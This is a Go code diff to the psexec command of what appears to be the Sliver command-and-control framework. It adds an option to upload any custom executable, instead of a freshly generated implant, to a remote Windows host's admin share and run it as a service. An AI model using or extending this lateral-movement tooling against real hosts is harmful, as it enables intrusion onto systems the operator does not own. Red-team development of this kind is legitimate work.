@@ -21,6 +21,7 @@ package exec
 import (
 	"context"
 	"fmt"
+	"io/ioutil"
 	insecureRand "math/rand"
 	"strings"
 	"time"
@@ -47,10 +48,12 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		con.PrintErrorf("You need to provide a target host, see `help psexec` for examples")
 		return
 	}
+	var serviceBinary []byte
 	profile := ctx.Flags.String("profile")
 	serviceName := ctx.Flags.String("service-name")
 	serviceDesc := ctx.Flags.String("service-description")
 	binPath := ctx.Flags.String("binpath")
+	customExe := ctx.Flags.String("custom-exe")
 	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.String("binpath")), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
@@ -61,35 +64,46 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		}
 	}
 
-	if profile == "" {
-		con.PrintErrorf("You need to pass a profile name, see `help psexec` for more info\n")
-		return
+	if customExe == "" {
+		if profile == "" {
+			con.PrintErrorf("You need to pass a profile name, see `help psexec` for more info\n")
+			return
+		}
+
+		// generate sliver
+		generateCtrl := make(chan bool)
+		con.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
+		profiles, err := con.Rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
+		if err != nil {
+			con.PrintErrorf("Error: %s\n", err)
+			return
+		}
+		generateCtrl <- true
+		<-generateCtrl
+		var implantProfile *clientpb.ImplantProfile
+		for _, prof := range profiles.Profiles {
+			if prof.Name == profile {
+				implantProfile = prof
+			}
+		}
+		if implantProfile.GetName() == "" {
+			con.PrintErrorf("No profile found for name %s\n", profile)
+			return
+		}
+		serviceBinary, _ = generate.GetSliverBinary(implantProfile, con)
+	} else {
+		// use a custom exe instead of generating a new Sliver
+		fileBytes, err := ioutil.ReadFile(customExe)
+		if err != nil {
+			con.PrintErrorf("Error reading custom executable '%s'\n", customExe)
+			return
+		}
+		serviceBinary = fileBytes
 	}
 
-	// generate sliver
-	generateCtrl := make(chan bool)
-	con.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
-	profiles, err := con.Rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
-	if err != nil {
-		con.PrintErrorf("Error: %s\n", err)
-		return
-	}
-	generateCtrl <- true
-	<-generateCtrl
-	var implantProfile *clientpb.ImplantProfile
-	for _, prof := range profiles.Profiles {
-		if prof.Name == profile {
-			implantProfile = prof
-		}
-	}
-	if implantProfile.GetName() == "" {
-		con.PrintErrorf("No profile found for name %s\n", profile)
-		return
-	}
-	sliverBinary, _ := generate.GetSliverBinary(implantProfile, con)
 	filename := randomString(10)
 	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
-	uploadGzip := new(encoders.Gzip).Encode(sliverBinary)
+	uploadGzip := new(encoders.Gzip).Encode(serviceBinary)
 	// upload to remote target
 	uploadCtrl := make(chan bool)
 	con.SpinUntil("Uploading service binary ...", uploadCtrl)
